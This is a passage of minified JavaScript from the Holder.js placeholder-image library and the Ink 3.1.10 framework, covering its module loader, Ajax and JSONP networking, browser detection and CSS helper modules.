e.measureText(l).width/r>1&&(o=n.size/(e.measureText(l).width/r)),e.font="bold "+o*i+"px "+s,e.fillText(l,r/2,a/2,r),h.toDataURL("image/png")}function a(e,t,n,i){var a=n.dimensions,s=n.theme,l=n.text?decodeURIComponent(n.text):n.text,c=a.width+"x"+a.height;s=l?o(s,{text:l}):s,s=n.font?o(s,{font:n.font}):s,"image"==e?(t.setAttribute("data-src",i),t.setAttribute("alt",l||(s.text?s.text+" ["+c+"]":c)),!d&&n.auto||(t.style.width=a.width+"px",t.style.height=a.height+"px"),d?t.style.backgroundColor=s.background:t.setAttribute("src",r(p,a,s,g))):d||(t.style.backgroundImage="url("+r(p,a,s,g)+")",t.style.backgroundSize=a.width+"px "+a.height+"px")}function s(e,t,n){var i=t.dimensions,r=t.theme,a=t.text,s=i.width+"x"+i.height;r=a?o(r,{text:a}):r;var c=document.createElement("div");e.fluidRef&&(c=e.fluidRef),c.style.backgroundColor=r.background,c.style.color=r.foreground,c.className=e.className+" holderjs-fluid",c.style.width=t.dimensions.width+(t.dimensions.width.indexOf("%")>0?"":"px"),c.style.height=t.dimensions.height+(t.dimensions.height.indexOf("%")>0?"":"px"),c.id=e.id,e.style.width=0,e.style.height=0,e.fluidRef||(r.text?c.appendChild(document.createTextNode(r.text)):(c.appendChild(document.createTextNode(s)),v.push(c),setTimeout(l,0))),e.fluidRef=c,e.parentNode.insertBefore(c,e.nextSibling),window.jQuery&&jQuery((function(t){t(e).on("load",(function(){e.style.width=c.style.width,e.style.height=c.style.height,t(e).show(),t(c).remove()}))}))}function l(){for(i in v)if(v.hasOwnProperty(i)){var e=v[i],t=e.firstChild;e.style.lineHeight=e.offsetHeight+"px",t.data=e.offsetWidth+"x"+e.offsetHeight}}function c(t,n){var i={theme:y.themes.gray},o=!1;for(sl=t.length,j=0;j<sl;j++){var r=t[j];e.flags.dimensions.match(r)?(o=!0,i.dimensions=e.flags.dimensions.output(r)):e.flags.fluid.match(r)?(o=!0,i.dimensions=e.flags.fluid.output(r),i.fluid=!0):e.flags.colors.match(r)?i.theme=e.flags.colors.output(r):n.themes[r]?i.theme=n.themes[r]:e.flags.text.match(r)?i.text=e.flags.text.output(r):e.flags.font.match(r)?i.font=e.flags.font.output(r):e.flags.auto.match(r)&&(i.auto=!0)}return!!o&&i}var u=!1,d=!1,h=document.createElement("canvas");if(document.getElementsByClassName||(document.getElementsByClassName=function(e){var t,n,i,o=document,r=[];if(o.querySelectorAll)return o.querySelectorAll("."+e);if(o.evaluate)for(n=".//*[contains(concat(' ', @class, ' '), ' "+e+" ')]",t=o.evaluate(n,o,null,0,null);i=t.iterateNext();)r.push(i);else for(t=o.getElementsByTagName("*"),n=new RegExp("(^|\\s)"+e+"(\\s|$)"),i=0;i<t.length;i++)n.test(t[i].className)&&r.push(t[i]);return r}),window.getComputedStyle||(window.getComputedStyle=function(e,t){return this.el=e,this.getPropertyValue=function(t){var n=/(\-([a-z]){1})/g;return"float"==t&&(t="styleFloat"),n.test(t)&&(t=t.replace(n,(function(){return arguments[2].toUpperCase()}))),e.currentStyle[t]?e.currentStyle[t]:null},this}),Object.prototype.hasOwnProperty||(Object.prototype.hasOwnProperty=function(e){var t=this.__proto__||this.constructor.prototype;return e in this&&(!(e in t)||t[e]!==this[e])}),h.getContext)if(h.toDataURL("image/png").indexOf("data:image/png")<0)d=!0;else var p=h.getContext("2d");else d=!0;var f=1,m=1;d||(f=window.devicePixelRatio||1,m=p.webkitBackingStorePixelRatio||p.mozBackingStorePixelRatio||p.msBackingStorePixelRatio||p.oBackingStorePixelRatio||p.backingStorePixelRatio||1);var g=f/m,v=[],y={domain:"holder.js",images:"img",bgnodes:".holderjs",themes:{gray:{background:"#eee",foreground:"#aaa",size:12},social:{background:"#3a5a97",foreground:"#fff",size:12},industrial:{background:"#434A52",foreground:"#C2F200",size:12},ink:{background:"#222",foreground:"#fff",size:18}},stylesheet:".holderjs-fluid {font-size:16px;font-weight:bold;text-align:center;font-family:sans-serif;margin:0}"};for(var _ in e.flags={dimensions:{regex:/^(\d+)x(\d+)$/,output:function(e){var t=this.regex.exec(e);return{width:+t[1],height:+t[2]}}},fluid:{regex:/^([0-9%]+)x([0-9%]+)$/,output:function(e){var t=this.regex.exec(e);return{width:t[1],height:t[2]}}},colors:{regex:/#([0-9a-f]{3,})\:#([0-9a-f]{3,})/i,output:function(e){var t=this.regex.exec(e);return{size:y.themes.gray.size,foreground:"#"+t[2],background:"#"+t[1]}}},text:{regex:/text\:(.*)/,output:function(e){return this.regex.exec(e)[1]}},font:{regex:/font\:(.*)/,output:function(e){return this.regex.exec(e)[1]}},auto:{regex:/^auto$/}},e.flags)e.flags.hasOwnProperty(_)&&(e.flags[_].match=function(e){return e.match(this.regex)});e.add_theme=function(t,n){return null!=t&&null!=n&&(y.themes[t]=n),e},e.add_image=function(t,i){var o=n(i);if(o.length)for(var r=0,a=o.length;r<a;r++){var s=document.createElement("img");s.setAttribute("data-src",t),o[r].appendChild(s)}return e},e.run=function(t){var i=o(y,t),r=[],l=[],d=[];for("string"==typeof i.images?l=n(i.images):window.NodeList&&i.images instanceof window.NodeList?l=i.images:window.Node&&i.images instanceof window.Node&&(l=[i.images]),"string"==typeof i.bgnodes?d=n(i.bgnodes):window.NodeList&&i.elements instanceof window.NodeList?d=i.bgnodes:window.Node&&i.bgnodes instanceof window.Node&&(d=[i.bgnodes]),u=!0,m=0,f=l.length;m<f;m++)r.push(l[m]);var h=document.getElementById("holderjs-style");h||((h=document.createElement("style")).setAttribute("id","holderjs-style"),h.type="text/css",document.getElementsByTagName("head")[0].appendChild(h)),i.nocss||(h.styleSheet?h.styleSheet.cssText+=i.stylesheet:h.appendChild(document.createTextNode(i.stylesheet)));for(var p=new RegExp(i.domain+'/(.*?)"?\\)'),f=d.length,m=0;m<f;m++){var g=window.getComputedStyle(d[m],null).getPropertyValue("background-image"),v=g.match(p);if(v)(_=c(v[1].split("/"),i))&&a("background",d[m],_,g)}for(f=r.length,m=0;m<f;m++){var _,b=attr_data_src=g=null;try{b=r[m].getAttribute("src"),attr_datasrc=r[m].getAttribute("data-src")}catch(e){}if(null==attr_datasrc&&b&&b.indexOf(i.domain)>=0?g=b:attr_datasrc&&attr_datasrc.indexOf(i.domain)>=0&&(g=attr_datasrc),g)(_=c(g.substr(g.lastIndexOf(i.domain)+i.domain.length+1).split("/"),i))&&(_.fluid?s(r[m],_):a("image",r[m],_,g))}return e},function(e,t){var n="complete",i="readystatechange",o=!1,r=o,a=!0,s=e.document,l=s.documentElement,c=s.addEventListener?"addEventListener":"attachEvent",u=s.addEventListener?"removeEventListener":"detachEvent",d=s.addEventListener?"":"on",h=function(a){(a.type!=i||s.readyState==n)&&(("load"==a.type?e:s)[u](d+a.type,h,o),!r&&(r=!0)&&t.call(e,null))},p=function(){try{l.doScroll("left")}catch(e){return void setTimeout(p,50)}h("poll")};if(s.readyState==n)t.call(e,"lazy");else{if(s.createEventObject&&l.doScroll){try{a=!e.frameElement}catch(e){}a&&p()}s[c](d+"DOMContentLoaded",h,o),s[c](d+i,h,o),e[c](d+"load",h,o)}}(t,(function(){window.addEventListener?(window.addEventListener("resize",l,!1),window.addEventListener("orientationchange",l,!1)):window.attachEvent("onresize",l),u||e.run()})),"function"==typeof define&&define.amd&&define("Holder",[],(function(){return e}))}(Holder,window),function(e,t){"use strict";if(!("Ink"in e)||"function"!=typeof Ink.requireModules){var n={},i={},o=[],r={},a=[],s={},l=Function.prototype.apply,c=function(e){if("object"!=typeof e)return!1;for(var t in e)if(e.hasOwnProperty(t))return!1;return!0};e.Ink={VERSION:"3.1.10",_checkPendingRequireModules:function(){var e,t,n,o,r,s,l=[],c=[];for(e=0,t=a.length;e<t;++e)if(n=a[e]){for(o in n.left)n.left.hasOwnProperty(o)&&((r=i[o])&&(n.args[n.left[o]]=r,delete n.left[o],--n.remaining));if(n.remaining>0)l.push(n);else{if(!(s=n.cb))continue;delete n.cb,c.push([s,n.args])}}a=l;for(var u=0;u<c.length;u++)c[u][0].apply(!1,c[u][1]);a.length>0&&setTimeout((function(){Ink._checkPendingRequireModules()}),0)},getPath:function(e,t){var i,o,r,a,s=e.split(/[._]/g);for(o=s.length;o>=0;o-=1)if(i=s.slice(0,o+1).join("."),n[i]){r=i;break}return r in n?(a=n[r],/\/$/.test(a)||(a+="/"),o<s.length&&(a+=s.slice(o+1).join("/")+"/"),t||(a+="lib.js"),a):null},setPath:function(e,t){n[e.replace(/_/,".")]=t},loadScript:function(e,n){if(-1===e.indexOf("/")){var i=e;if(null===(e=this.getPath(e)))throw new Error('Could not load script "'+i+'". Path not found in the registry. Did you misspell the name, or forgot to call setPath()?')}var o=t.createElement("script");o.setAttribute("type",n||"text/javascript"),o.setAttribute("src",e),"onerror"in o&&(o.onerror=function(){Ink.error(["Failed to load script from ",e,"."].join(""))});var r=t.head||t.getElementsByTagName("head")[0];if(r)return r.appendChild(o)},_loadLater:function(e){setTimeout((function(){i[e]||r[e]||s[e]||(r[e]=!0,Ink.loadScript(e))}),0)},namespace:function(t,n){if(!t||!t.length)return null;for(var i,o=t.split("."),r=e,a=0,s=o.length;a<s;++a)r[o[a]]=r[o[a]]||{},i=r,r=r[o[a]];return n?[i,o[a-1]]:r},getModule:function(e,t){var n=t?[e,"_",t].join(""):e;return i[n]},createModule:function(t,n,a,l){if("string"!=typeof t)throw new Error("module name must be a string!");if(!("number"==typeof n||"string"==typeof n&&n.length>0))throw new Error("version number missing!");var u=[t,"_",n].join("");s[u]=!0;this.requireModules(a,(function(){if(!i[u]){delete r[u],delete r[t];var a=Array.prototype.slice.call(arguments),d=l.apply(e,a);o.push(u),"object"==typeof d?d._version=n:"function"==typeof d&&(d.prototype._version=n,d._version=n);var h,p=0===t.indexOf("Ink.");p&&(h=Ink.namespace(t,!0)),i[u]=d,delete s[u],p&&(h[0][h[1]+"_"+n]=d),i[t]=d,p&&c(h[0][h[1]])&&(h[0][h[1]]=d),this&&Ink._checkPendingRequireModules()}}))},requireModules:function(e,t){var n,o,s,l,c;if(o=e&&e.length,s={args:new Array(o),left:{},remaining:o,cb:t},"object"!=typeof e||void 0===e.length)throw new Error("Dependency list should be an array!");if("function"!=typeof t)throw new Error("Callback should be a function!");for(n=0;n<o;++n)Ink._moduleRenames[e[n]]?(Ink.warn(e[n]+" was renamed to "+Ink._moduleRenames[e[n]]),l=Ink._moduleRenames[e[n]]):l=e[n],l?(c=i[l])?(s.args[n]=c,--s.remaining):(r[l]||Ink._loadLater(l),s.left[l]=n):--s.remaining;s.remaining>0?a.push(s):t.apply(!0,s.args)},_moduleRenames:{"Ink.UI.Aux_1":"Ink.UI.Common_1"},getModulesLoadOrder:function(){return o.slice()},getModuleScripts:function(){var e=this.getModulesLoadOrder();return e.unshift("Ink_1"),(e=e.map((function(e){return["<scr",'ipt type="text/javascript" src="',Ink.getModuleURL(e),'"></scr',"ipt>"].join("")}))).join("\n")},createExt:function(e,t,n,i){return Ink.createModule("Ink.Ext."+e,t,n,i)},bind:function(e,t){var n=Array.prototype.slice.call(arguments,2);return function(){var i=Array.prototype.slice.call(arguments),o=n.concat(i);return e.apply(!1===t?this:t,o)}},bindMethod:function(e,t){return Ink.bind.apply(Ink,[e[t],e].concat([].slice.call(arguments,2)))},bindEvent:function(t,n){var i=Array.prototype.slice.call(arguments,2);return function(o){var r=i.slice();return r.unshift(o||e.event),t.apply(!1===n?this:n,r)}},i:function(e){return"string"==typeof e?t.getElementById(e)||null:e},ss:function(e,n){if(void 0===Ink.Dom||void 0===Ink.Dom.Selector)throw new Error("This method requires Ink.Dom.Selector");return Ink.Dom.Selector.select(e,n||t)},s:function(e,n){if(void 0===Ink.Dom||void 0===Ink.Dom.Selector)throw new Error("This method requires Ink.Dom.Selector");return Ink.Dom.Selector.select(e,n||t)[0]||null},extendObj:function(e){for(var t=[].slice.call(arguments,1),n=0,i=t.length;n<i;n++)if(t[n])for(var o in t[n])Object.prototype.hasOwnProperty.call(t[n],o)&&(e[o]=t[n][o]);return e},log:function(){var t=e.console;t&&t.log&&l.call(t.log,t,arguments)},warn:function(){var t=e.console;t&&t.warn&&l.call(t.warn,t,arguments)},error:function(){var t=e.console;t&&t.error&&l.call(t.error,t,arguments)}}}}(window,document),Ink.createModule("Ink.Net.Ajax","1",[],(function(){"use strict";var Ajax=function(e,t){this.init(e,t)};Ajax.globalOptions={parameters:{},requestHeaders:{}};var xMLHttpRequestWithCredentials="XMLHttpRequest"in window&&"withCredentials"in new XMLHttpRequest;return Ajax.prototype={init:function(e,t){if(!e)throw new Error("new Ink.Net.Ajax: Pass a url as the first argument!");var n=Ink.extendObj({asynchronous:!0,contentType:"application/x-www-form-urlencoded",cors:!1,validateCors:!1,debug:!1,delay:0,evalJS:!0,method:"POST",parameters:null,postBody:"",requestHeaders:null,sanitizeJSON:!1,signRequest:!1,timeout:0,useCredentials:!1,xhrProxy:"",onComplete:null,onCreate:null,onException:null,onFailure:null,onHeaders:null,onInit:null,onSuccess:null,onTimeout:null},Ajax.globalOptions);if(t&&"object"==typeof t){if(n=Ink.extendObj(n,t),"object"==typeof t.parameters)n.parameters=Ink.extendObj(Ink.extendObj({},Ajax.globalOptions.parameters),t.parameters);else if(null!==t.parameters){var i=this.paramsObjToStr(Ajax.globalOptions.parameters);i&&(n.parameters=t.parameters+"&"+i)}n.requestHeaders=Ink.extendObj({},Ajax.globalOptions.requestHeaders),n.requestHeaders=Ink.extendObj(n.requestHeaders,t.requestHeaders)}this.options=n,this.safeCall("onInit"),this.url=e;var o=this._locationFromURL(e);this.isHTTP=this._locationIsHTTP(o),this.isCrossDomain=this._locationIsCrossDomain(o,location),this.requestHasBody=n.method.search(/^get|head$/i)<0,!0===this.options.validateCors&&(this.options.cors=this.isCrossDomain),this.options.cors&&(this.isCrossDomain=!1),this.transport=this.getTransport(),this.request()},_locationFromURL:function(e){var t=document.createElementNS?document.createElementNS("http://www.w3.org/1999/xhtml","a"):document.createElement("a");return t.setAttribute("href",e),t},_locationIsHTTP:function(e){return!!e.href.match(/^https?:/i)},_locationIsCrossDomain:function(e,t){if(t=t||window.location,Ajax.prototype._locationIsHTTP(e)&&"widget:"!==t.protocol&&"object"!=typeof window.widget){var n=e.href.split("//"),i=t.href.split("//");if(1===n.length||1===i.length)return!1;var o=n[0],r=i[0],a=/:|\//,s=n[1].split(a)[0],l=i[1].split(a)[0];return o!==r||s!==l}return!1},getTransport:function(){if(!xMLHttpRequestWithCredentials&&this.options.cors&&"XDomainRequest"in window)return this.usingXDomainReq=!0,new XDomainRequest;if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;if("undefined"==typeof ActiveXObject)return null;try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){return new ActiveXObject("Microsoft.XMLHTTP")}},setHeaders:function(){if(this.transport)try{var e={Accept:"text/javascript,text/xml,application/xml,application/xhtml+xml,text/html,application/json;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1","Accept-Language":navigator.language,"X-Requested-With":"XMLHttpRequest","X-Ink-Version":"3"};if(this.options.cors&&(this.options.signRequest||delete e["X-Requested-With"],delete e["X-Ink-Version"]),this.options.requestHeaders&&"object"==typeof this.options.requestHeaders)for(var t in this.options.requestHeaders)this.options.requestHeaders.hasOwnProperty(t)&&(e[t]=this.options.requestHeaders[t]);for(var n in this.transport.overrideMimeType&&(navigator.userAgent.match(/Gecko\/(\d{4})/)||[0,2005])[1]<2005&&(e.Connection="close"),e)e.hasOwnProperty(n)&&this.transport.setRequestHeader(n,e[n])}catch(e){}},paramsObjToStr:function(e){var t,n,i,o,r=[];if("object"!=typeof e)return e;for(i in e)if(e.hasOwnProperty(i))if(o=e[i],"[object Array]"!==Object.prototype.toString.call(o)||isNaN(o.length))r=r.concat([encodeURIComponent(i),"=",encodeURIComponent(o),"&"]);else for(t=0,n=o.length;t<n;t++)r=r.concat([encodeURIComponent(i),"[]","=",encodeURIComponent(o[t]),"&"]);return r.length>0&&r.pop(),r.join("")},setParams:function(){var e,t=this.options.parameters;(e="object"==typeof t?this.paramsObjToStr(t):""+t)&&(this.url.indexOf("?")>-1?this.url=this.url.split("#")[0]+"&"+e:this.url=this.url.split("#")[0]+"?"+e)},getHeader:function(e){if(this.usingXDomainReq&&"Content-Type"===e)return this.transport.contentType;try{return this.transport.getResponseHeader(e)}catch(e){return null}},getAllHeaders:function(){try{return this.transport.getAllResponseHeaders()}catch(e){return null}},getResponse:function(){var e=this.transport,t={headerJSON:null,responseJSON:null,getHeader:this.getHeader,getAllHeaders:this.getAllHeaders,request:this,transport:e,timeTaken:new Date-this.startTime,requestedUrl:this.url};t.readyState=e.readyState;try{t.responseText=e.responseText}catch(e){}try{t.responseXML=e.responseXML}catch(e){}try{t.status=e.status}catch(e){t.status=0}try{t.statusText=e.statusText}catch(e){t.statusText=""}return t},abort:function(){if(this.transport){clearTimeout(this.delayTimeout),clearTimeout(this.stoTimeout),this._aborted=!0;try{this.transport.abort()}catch(e){}this.finish()}},runStateChange:function(){if(!this._aborted){var e=this.transport.readyState;if(3===e)this.isHTTP&&this.safeCall("onHeaders");else if(4===e||this.usingXDomainReq){if(this.options.asynchronous&&this.options.delay&&this.startTime+this.options.delay>(new Date).getTime())return void(this.delayTimeout=setTimeout(Ink.bind(this.runStateChange,this),this.options.delay+this.startTime-(new Date).getTime()));var t,n=this.transport.responseText,i=this.getResponse(),o=this.transport.status;this.isHTTP&&!this.options.asynchronous&&this.safeCall("onHeaders"),clearTimeout(this.stoTimeout),0===o?this.isHTTP?this.safeCall("onException",new Error("Ink.Net.Ajax: network error! (HTTP status 0)")):o=n?200:404:304===o&&(o=200);var r=this.usingXDomainReq||200<=o&&o<300,a=this.getHeader("Content-Type")||"";if(this.options.evalJS&&(a.indexOf("application/json")>=0||"force"===this.options.evalJS))try{(t=this.evalJSON(n,this.sanitizeJSON))&&(n=i.responseJSON=t)}catch(e){r&&this.safeCall("onException",e)}if(this.usingXDomainReq&&-1!==a.indexOf("xml")&&"DOMParser"in window){var s;switch(a){case"application/xml":case"application/xhtml+xml":case"image/svg+xml":s=a;break;default:s="text/xml"}var l=(new DOMParser).parseFromString(this.transport.responseText,s);this.transport.responseXML=l,i.responseXML=l}null!=this.transport.responseXML&&null==i.responseJSON&&""!==this.transport.responseXML.xml&&(n=this.transport.responseXML),(o||this.usingXDomainReq)&&(r?this.safeCall("onSuccess",i,n):this.safeCall("onFailure",i,n),this.safeCall("on"+o,i,n)),this.finish(i,n)}}},finish:function(e,t){if(e&&this.safeCall("onComplete",e,t),clearTimeout(this.stoTimeout),this.transport){try{this.transport.onreadystatechange=null}catch(e){}"function"==typeof this.transport.destroy&&this.transport.destroy(),this.transport=null}},safeCall:function(e){var t=arguments[1]instanceof Error?arguments[1]:null;if("function"==typeof this.options[e])try{this.options[e].apply(this,[].slice.call(arguments,1))}catch(t){Ink.error("Ink.Net.Ajax: an error was raised while executing "+e+".",t)}else t&&Ink.error("Ink.Net.Ajax: "+t)},setRequestHeader:function(e,t){this.options.requestHeaders||(this.options.requestHeaders={}),this.options.requestHeaders[e]=t},request:function(){if(this.transport){var e=null;this.requestHasBody?(null!==this.options.postBody&&""!==this.options.postBody?(e=this.options.postBody,this.setParams()):null!==this.options.parameters&&""!==this.options.parameters&&(e=this.options.parameters),"object"!=typeof e||e.nodeType?"object"!=typeof e&&null!==e&&(e=""+e):e=this.paramsObjToStr(e),this.options.contentType&&this.setRequestHeader("Content-Type",this.options.contentType)):this.setParams();var t=this.url,n=this.options.method,i=this.isCrossDomain;i&&this.options.xhrProxy&&(this.setRequestHeader("X-Url",t),t=this.options.xhrProxy+encodeURIComponent(t),i=!1);try{this.transport.open(n,t,this.options.asynchronous)}catch(e){return this.safeCall("onException",e),this.finish(this.getResponse(),null)}this.setHeaders(),this.safeCall("onCreate"),this.options.timeout&&!isNaN(this.options.timeout)&&(this.stoTimeout=setTimeout(Ink.bind((function(){this.options.onTimeout&&(this.safeCall("onTimeout"),this.abort())}),this),1e3*this.options.timeout)),this.options.useCredentials&&!this.usingXDomainReq&&(this.transport.withCredentials=!0),this.options.asynchronous&&!this.usingXDomainReq?this.transport.onreadystatechange=Ink.bind(this.runStateChange,this):this.usingXDomainReq&&(this.transport.onload=Ink.bind(this.runStateChange,this));try{if(i)return void Ink.error("Ink.Net.Ajax: You are attempting to request a URL which is cross-domain from this one. To do this, you *must* enable the `cors` option!");this.startTime=(new Date).getTime(),this.transport.send(e)}catch(e){return this.safeCall("onException",e),this.finish(this.getResponse(),null)}this.options.asynchronous||this.runStateChange()}},isJSON:function(e){return!("string"!=typeof e||!e)&&(e=e.replace(/\\./g,"@").replace(/"[^"\\\n\r]*"/g,""),/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/.test(e))},evalJSON:function(strJSON,sanitize){if(strJSON&&(!sanitize||this.isJSON(strJSON)))try{return"undefined"!=typeof JSON&&void 0!==JSON.parse?JSON.parse(strJSON):eval("("+strJSON+")")}catch(e){throw new Error("Ink.Net.Ajax: Bad JSON string. "+e)}return null}},Ajax.load=function(e,t){var n=Ajax.prototype._locationIsCrossDomain(window.location,Ajax.prototype._locationFromURL(e));return new Ajax(e,{method:"GET",cors:n,onSuccess:function(e){t(e.responseJSON||e.responseText,e)}})},Ajax.ping=function(e,t){var n=Ajax.prototype._locationIsCrossDomain(window.location,Ajax.prototype._locationFromURL(e));return new Ajax(e,{method:"HEAD",cors:n,onSuccess:function(e){"function"==typeof t&&t(e)}})},Ajax})),Ink.createModule("Ink.Net.JsonP","1",[],(function(){"use strict";var e=function(e,t){this.init(e,t)};return e.prototype={init:function(e,t){if(this.options=Ink.extendObj({onSuccess:void 0,onFailure:void 0,failureObj:{},timeout:10,params:{},callbackParam:"jsoncallback",internalCallback:"_cb",randVar:!1},t||{}),!1!==this.options.randVar?this.randVar=this.options.randVar:this.randVar=parseInt(1e5*Math.random(),10),this.options.internalCallback+=this.randVar,this.uri=e,"function"==typeof this.options.onComplete&&(this.options.onSuccess=this.options.onComplete),"string"!=typeof this.uri)throw new Error("Ink.Net.JsonP: Please define an URI");if("function"!=typeof this.options.onSuccess)throw new Error("Ink.Net.JsonP: please define a callback function on option onSuccess!");Ink.Net.JsonP[this.options.internalCallback]=Ink.bind((function(){this.options.onSuccess(arguments[0]),this._cleanUp()}),this),this.timeout=setTimeout(Ink.bind((function(){this.abort(),"function"==typeof this.options.onFailure&&this.options.onFailure(this.options.failureObj)}),this),1e3*this.options.timeout),this._addScriptTag()},abort:function(){Ink.Net.JsonP[this.options.internalCallback]=Ink.bindMethod(this,"_cleanUp")},_addParamsToGet:function(e,t){var n,i,o,r=-1!==e.indexOf("?"),a=[e];for(i in t)t.hasOwnProperty(i)&&(r?n="&":(n="?",r=!0),"number"==typeof(o=t[i])||o||(o=""),a=a.concat([n,i,"=",encodeURIComponent(o)]));return a.join("")},_getScriptContainer:function(){return document.body||document.getElementsByTagName("body")[0]||document.getElementsByTagName("head")[0]||document.documentElement},_addScriptTag:function(){this.options.params[this.options.callbackParam]="Ink.Net.JsonP."+this.options.internalCallback,this.options.params.rnd_seed=this.randVar,this.uri=this._addParamsToGet(this.uri,this.options.params),this._scriptEl=document.createElement("script"),this._scriptEl.type="text/javascript",this._scriptEl.src=this.uri,this._getScriptContainer().appendChild(this._scriptEl)},_cleanUp:function(){this.timeout&&window.clearTimeout(this.timeout),delete this.options.onSuccess,delete this.options.onFailure,delete Ink.Net.JsonP[this.options.internalCallback],this._removeScriptTag()},_removeScriptTag:function(){this._scriptEl&&(this._scriptEl.parentNode.removeChild(this._scriptEl),delete this._scriptEl)}},e})),Ink.createModule("Ink.Dom.Browser","1",[],(function(){"use strict";var e={IE:!1,GECKO:!1,OPERA:!1,SAFARI:!1,KONQUEROR:!1,CHROME:!1,model:!1,version:!1,userAgent:!1,cssPrefix:!1,domPrefix:!1,init:function(){this.detectBrowser(),this.setDimensions(),this.setReferrer()},setDimensions:function(){var e=0,t=0;"number"==typeof window.innerWidth?(e=window.innerWidth,t=window.innerHeight):document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)?(e=document.documentElement.clientWidth,t=document.documentElement.clientHeight):document.body&&(document.body.clientWidth||document.body.clientHeight)&&(e=document.body.clientWidth,t=document.body.clientHeight),this.windowWidth=e,this.windowHeight=t},setReferrer:function(){document.referrer&&document.referrer.length?this.referrer=window.escape(document.referrer):this.referrer=!1},detectBrowser:function(){this._sniffUserAgent(navigator.userAgent)},_sniffUserAgent:function(e){if(this.userAgent=e,e=e.toLowerCase(),/applewebkit\//.test(e)&&!/iemobile/.test(e))if(this.cssPrefix="-webkit-",this.domPrefix="Webkit",/(chrome|crios)\//.test(e))this.CHROME=!0,this.model="chrome",this.version=e.replace(/(.*)chrome\/([^\s]+)(.*)/,"$2");else{this.SAFARI=!0,this.model="safari";var t=/version\/([^) ]+)/;t.test(e)?this.version=e.match(t)[1]:this.version=e.replace(/(.*)applewebkit\/([^\s]+)(.*)/,"$2")}else if(/opera/.test(e))this.OPERA=!0,this.model="opera",this.version=e.replace(/(.*)opera.([^\s$]+)(.*)/,"$2"),this.cssPrefix="-o-",this.domPrefix="O";else if(/konqueror/.test(e))this.KONQUEROR=!0,this.model="konqueror",this.version=e.replace(/(.*)konqueror\/([^;]+);(.*)/,"$2"),this.cssPrefix="-khtml-",this.domPrefix="Khtml";else if(/(msie|trident)/i.test(e))this.IE=!0,this.model="ie",/rv:((?:\d|\.)+)/.test(e)?this.version=e.match(/rv:((?:\d|\.)+)/)[1]:this.version=e.replace(/(.*)\smsie\s([^;]+);(.*)/,"$2"),this.cssPrefix="-ms-",this.domPrefix="ms";else if(/gecko/.test(e)){this.cssPrefix="-moz-",this.domPrefix="Moz",this.GECKO=!0;var n=/(camino|chimera|epiphany|minefield|firefox|firebird|phoenix|galeon|iceweasel|k\-meleon|seamonkey|netscape|songbird|sylera)/;if(n.test(e))this.model=e.match(n)[1],this.version=e.replace(new RegExp("(.*)"+this.model+"/([^;\\s$]+)(.*)"),"$2");else{this.model="mozilla";var i=/(.*)rv:([^)]+)(.*)/;i.test(e)&&(this.version=e.replace(i,"$2"))}}},debug:function(){var e="known browsers: (ie, gecko, opera, safari, konqueror) \n";e+=[this.IE,this.GECKO,this.OPERA,this.SAFARI,this.KONQUEROR]+"\n",e+="cssPrefix -> "+this.cssPrefix+"\n",e+="domPrefix -> "+this.domPrefix+"\n",e+="model -> "+this.model+"\n",e+="version -> "+this.version+"\n",e+="\n",e+="original UA -> "+this.userAgent,alert(e)}};return e.init(),e})),Ink.createModule("Ink.Dom.Css",1,[],(function(){"use strict";var e="defaultView"in document&&"getComputedStyle"in document.defaultView?document.defaultView.getComputedStyle:window.getComputedStyle,t={addRemoveClassName:function(e,t,n){return n?this.addClassName(e,t):void this.removeClassName(e,t)},addClassName:function(e,n){if(!(e=Ink.i(e))||!n)return null;for(var i=0,o=(n=(""+n).split(/[, ]+/)).length;i<o;i++)n[i].replace(/^\s+|\s+$/g,"")&&(void 0!==e.classList?e.classList.add(n[i]):t.hasClassName(e,n[i])||(e.className+=(e.className?" ":"")+n[i]))},removeClassName:function(e,t){if(!(e=Ink.i(e))||!t)return null;var n=0,i=(t=(""+t).split(/[, ]+/)).length;if(void 0!==e.classList)for(;n<i;n++)e.classList.remove(t[n]);else{for(var o,r=e.className||"";n<i;n++)o=new RegExp("(^|\\s+)"+t[n]+"(\\s+|$)"),r=r.replace(o," ");e.className=r.replace(/^\s+/,"").replace(/\s+$/,"")}},setClassName:function(e,t,n){this.addRemoveClassName(e,t,n||!1)},hasClassName:function(e,t,n){if(!(e=Ink.i(e))||!t)return!1;for(var i,o=0,r=(t=(""+t).split(/[, ]+/)).length;o<r;o++){if(void 0!==e.classList)i=e.classList.contains(t[o]);else{var a=e.className;a===t[o]?i=!0:i=new RegExp("(^|\\s)"+t[o]+"(\\s|$)").test(a)}if(i&&!n)return!0;if(!i&&n)return!1}return!!n},blinkClass:function(e,n,i,o){e=Ink.i(e),t.addRemoveClassName(e,n,!o),setTimeout((function(){t.addRemoveClassName(e,n,o)}),Number(i)||100)},toggleClassName:function(e,n,i){return!(!e||!n)&&(void 0!==i?t.addRemoveClassName(e,n,i):void(void 0===e.classList||/[, ]/.test(n)?t.hasClassName(e,n)?t.removeClassName(e,n):t.addClassName(e,n):(e=Ink.i(e),null!==e&&e.classList.toggle(n))))},setOpacity:function(e,t){if(null!==(e=Ink.i(e))){var n=1;isNaN(Number(t))||(n=t<=0?0:t<=1?t:t<=100?t/100:1),void 0!==e.style.opacity?e.style.opacity=n:e.style.filter="alpha(opacity:"+(100*n|0)+")"}},_camelCase:function(e){return e?e.replace(/-(\w)/g,(function(e,t){return t.toUpperCase()})):e},getStyle:function(t,n){if(null!==(t=Ink.i(t))&&t.style){n="float"===n?"cssFloat":this._camelCase(n);var i=t.style[n];if(!e||i&&"auto"!==i)!i&&t.currentStyle&&("auto"!==(i=t.currentStyle[n])||"width"!==n&&"height"!==n||(i=t["offset"+n.charAt(0).toUpperCase()+n.slice(1)]+"px"));else{var o=e(t,null);i=o?o[n]:null}if("opacity"===n)return i?parseFloat(i,10):1;if("borderTopWidth"===n||"borderBottomWidth"===n||"borderRightWidth"===n||"borderLeftWidth"===n){if("thin"===i)return"1px";if("medium"===i)return"3px";if("thick"===i)return"5px"}return"auto"===i?null:i}},setStyle:function(e,t){if(null!==(e=Ink.i(e)))if("string"==typeof t)e.style.cssText+="; "+t,-1!==t.indexOf("opacity")&&this.setOpacity(e,t.match(/opacity:\s*(\d?\.?\d*)/)[1]);else for(var n in 